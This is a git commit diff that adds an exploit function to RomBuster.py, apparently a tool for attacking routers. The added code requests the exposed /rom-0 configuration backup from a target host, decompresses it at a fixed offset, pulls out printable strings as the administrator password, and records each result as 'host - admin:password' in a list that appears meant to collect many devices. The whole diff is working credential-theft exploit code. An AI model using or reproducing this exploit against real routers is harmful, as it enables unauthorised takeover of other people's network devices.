f3963cfdd3cdb6c14cfb61831611d102db811d65
Ivan Nikolsky <enty8080@gmail.com>
2021-05-18 21:24:43 +0300

    Update RomBuster.py

--- RomBuster.py
+++ RomBuster.py
@@ -1,1 +1,18 @@
 #!/usr/bin/env python3
+
+def exploit(host, thread):
+    try:
+        response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
+    except Exception:
+        return # connection rejected
+
+    if response.status_code != 200:
+        return # not vulnerable
+
+    data = response.content[8568:]
+    result, window = LZSDecompress(data, RingList(2048))
+
+    password = re.findall("([\040-\176]{5,})", result)
+
+    if password[0]:
+        iots.append(f"{host} - admin:{password}")
